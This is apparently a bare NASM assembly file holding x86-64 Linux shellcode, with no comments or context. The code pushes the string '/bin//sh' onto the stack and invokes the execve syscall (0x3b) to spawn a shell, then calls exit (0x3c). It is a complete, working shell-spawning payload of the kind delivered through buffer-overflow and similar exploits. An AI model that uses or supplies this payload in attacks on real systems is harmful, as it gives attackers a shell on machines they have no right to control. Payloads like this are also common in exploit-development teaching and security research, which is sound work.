BITS 64

xor rax,rax
push rax
mov al, 0x3b
mov rdi, 0x68732f2f6e69622f
push rdi
mov rdi,rsp
xor rsi, rsi
xor rdx, rdx
syscall

mov al,0x3c
xor rdi,rdi
syscall
